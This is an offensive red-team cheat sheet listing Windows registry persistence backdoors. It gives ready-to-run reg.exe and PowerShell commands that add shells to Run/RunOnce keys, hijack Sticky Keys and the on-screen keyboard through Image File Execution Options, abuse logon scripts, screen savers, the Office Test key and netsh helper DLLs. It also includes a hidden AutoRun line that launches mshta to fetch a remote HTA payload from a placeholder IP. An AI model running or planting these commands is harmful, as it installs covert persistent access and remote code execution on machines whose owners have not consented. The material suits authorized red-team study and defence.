# Registry Keys

## 01 - Manual

### 1.1 - Registry Key Values

#### 1.1.1 - Registry key values both command prompt and powershell

|reg.exe|Set-ItemProperty|DataType in .reg|
|-------|----------------|----------------|
|REG_SZ|String||
|REG_EXPAND_SZ|ExpandString|hexadecimal(2)|
|REG_DWORD|DWord|dword|
|REG_QWORD|QWord|qword|
|REG_MULTI_SZ|MultiString|hexadecimal(7)|
|REG_BINARY|Binary|hexadecimal|

```
C:\> reg import file.reg

C:\> reg add "hklm\software\microsoft\windows\currentversion\run" /v <value> /t reg_sz /d "C:\path\to\shell.exe" /f
```

```powershell
PS C:\> set-itemproperty -path "hklm:\software\microsoft\windows\currentversion\run" -name "<value>" -propertytype string -value "C:\path\to\shell.exe" -force
```

### 1.2 - Registry Backdoors

#### 1.2.1 - HKLM

##### 1.2.1.1 - Syntax

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\run" /v <value> /t reg_sz /d "rundll32.exe C:\path\to\shell.dll,ExecDLL" /f`

##### 1.2.1.2 - Registry Paths

```
C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v UpdateOnce /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /v WindowsService /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v UpdateSVC /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v Dependency /t REG_SZ /d "C:\path\to\shell.dll"
```

##### 1.2.1.3 - Image File Execution Options

- Sticky Keys

```
C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

- Accessibility On-Screen Keyboard

```
C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

- Notepad

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\notepad" /v Debugger /d "C:\path\to\shell.exe"`

##### 1.2.1.4 - COM Hijacking

TODO: Fill this info

#### 1.2.2 - HKCU

##### 1.2.2.1 - Registry Paths

```
C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Image /t REG_SZ /d "powershell.exe -ep bypass -w hidden -nologo -NonI -f C:\path\to\shell.ps1" /f

C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" WindowsUpdate /t REG_SZ /d "rundll32.exe C:\path\to\shell.dll,ExecuteShell" /f

C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "powershell.exe Start-Process -windowstyle hidden -FilePath mshta.exe http://<IP>/shell.hta" /f
```

##### 1.2.2.2 - LogonScript

`C:\> reg add "HKCU\Environment" /v UserInitMprLogonScript /d "C:\path\to\shell.bat" /t REG_SZ /f`

##### 1.2.2.3 - Screen Saver

```
C:\> reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "<seconds>" /f
```

##### 1.2.2.4 - Microsoft Office

`C:\> reg add "HKCU\SOFTWARE\Microsoft\Office Test\Special\Perf" /t REG_SZ /d "C:\path\to\shell.dll" /f`

##### 1.2.2.5 - COM Hijacking

TODO: Fill this info

#### 1.2.3 - Netsh Backdoor

```
C:\> reg add "hklm\software\microsoft\windows\currentversion\run" /v "Firewall Rules Persist" /t reg_sz /d "C:\Windows\System32\netsh" /f

C:\> netsh add helper C:\path\to\shellDLL.dll

C:\> netsh

netsh> add helper C:\path\to\shellDLL.dll
```

- To cleanup the backdoor

```
C:\> netsh delete helper C:\path\to\shell.dll

C:\> netsh

netsh> delete helper C:\path\to\shell.dll

C:\> reg delete "HKLM\SOFTWARE\Microsoft\NetSh" /v shellDLL /f
```

## 02 - SharPersist

TODO: Fill this info

---
## References

- [Mandiant: SharPersist Windows Persistence Toolkit](https://www.mandiant.com/resources/sharpersist-windows-persistence-toolkit)

- [Zweilosec: Windows RedTeam Persistence](https://zweilosec.gitbook.io/hackers-rest/windows-1/windows-redteam/persistence)

- [Persistence Info](https://persistence-info.github.io/)